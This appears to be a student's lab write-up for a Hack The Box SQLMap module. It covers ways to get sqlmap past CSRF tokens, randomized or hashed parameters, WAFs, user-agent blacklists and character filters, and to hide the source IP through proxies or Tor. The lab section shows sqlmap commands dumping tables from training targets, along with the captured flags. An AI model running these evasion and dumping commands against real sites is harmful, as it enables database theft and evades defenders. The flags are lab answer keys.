# Bypassing Web Application Protections

## Anti-CSRF Token Bypass

sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

## Unique Value Bypass

sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

## Calculated Parameter Bypass

sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

## IP Address Concealing

--proxy="socks4://177.39.187.70:33283"
--proxy-file
--tor
--check-tor

SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).

## WAF Bypass

For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.

--skip-waf

## User-agent Blacklisting Bypass

Default User-Agent : User-agent: sqlmap/1.4.9

--random-agent

## Tamper Scripts

--tamper=between,randomcase

## Miscellaneous Bypasses

--chunked

### LAB

# anti-CSRF token bypass

sqlmap -u "http://94.237.62.195:57826/case8.php" --data="id=1&t0ken=xlyNPaso1rqcMzpAmFDwQIqAA3qSigIRgmFx856h0c" --csrf-token="t0ken" --dump -T flag8 -D testdb

Database: testdb
Table: flag8
[1 entry]
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
+----+-----------------------------------+

# Unique ID

sqlmap -u "http://94.237.62.195:57826/case9.php?id=1&uid=719489332" --randomize=uid --batch -v 5 --dump -T flag9 -D testdb

Database: testdb
Table: flag9
[1 entry]
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
+----+---------------------------------------+


# Primitive protection

http://94.237.62.195:57826/case10.php



sqlmap -u "http://94.237.62.195:57826/case10.php" --tamper=between,randomcase --data 'id=1' --dump -T flag10 -D testdb

--> failed

vi case10.txt

POST /case10.php HTTP/1.1
Host: 94.237.62.195:57826
Content-Length: 4
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://94.237.62.195:57826
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:57826/case10.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=pihqfqfcd15aaipijibf5nln0a
Connection: close

id=1

--> Failed to create .txt file using vi , need to use text editor

sqlmap -r case10.txt --dump -T flag10 -D testdb

Database: testdb
Table: flag10
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{y37_4n07h3r_r4nd0m1z3} |
+----+----------------------------+

## Filtering of characters

http://94.237.62.195:57826/case11.php?id=1

sqlmap -u "http://94.237.62.195:57826/case11.php?id=1" --tamper=base64encode --dump -T flag11 -D testdb

--> failed

sqlmap -u "http://94.237.62.195:57826/case11.php?id=1" --tamper=base64encode -v 5 --dump -T flag11 -D testdb

--> failed


sqlmap -u "http://94.237.62.195:57826/case11.php?id=1" --tamper=base64encode -v 5 --risk 3 --dump -T flag11 -D testdb

--> failed

GET /case11.php?id=1 HTTP/1.1
Host: 94.237.62.195:57826
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:57826/case11.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=pihqfqfcd15aaipijibf5nln0a
Connection: close

sqlmap -r case11.txt --dump -T flag11 -D testdb

--> failed

sqlmap -u "http://83.136.250.104:36881/case11.php?id=1" --skip-waf --dump -T flag11 -D testdb

[13:01:29] [INFO] fetching entries for table 'flag11' in database 'testdb'
[13:01:29] [INFO] fetching number of entries for table 'flag11' in database 'testdb'


sqlmap -u 'http://83.136.250.104:36881/case11.php?id=1' --skip-waf --tables -D testdb

sqlmap -u 'http://83.136.250.104:36881/case11.php?id=1' --tamper=charencode --tables -D testdb

Database: testdb
[3 tables]
+------------------+
| hostbenchmarks   |
| routerbenchmarks |
| users            |
+------------------+

sqlmap -u 'http://83.136.250.104:36881/case11.php?id=1' --tamper=charencode --search -T flag11

[13:01:29] [INFO] fetching entries for table 'flag11' in database 'testdb'
[13:01:29] [INFO] fetching number of entries for table 'flag11' in database 'testdb'

sqlmap -u 'http://83.136.250.104:36881/case11.php?id=1' --tamper=charencode --dump -T flag11 -D testdb

[13:01:29] [INFO] fetching entries for table 'flag11' in database 'testdb'
[13:01:29] [INFO] fetching number of entries for table 'flag11' in database 'testdb'

sqlmap -u 'http://83.136.250.104:36881/case11.php?id=1' --tamper=between --dump -T flag11 -D testdb

Database: testdb
Table: flag11
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
+----+----------------------------+
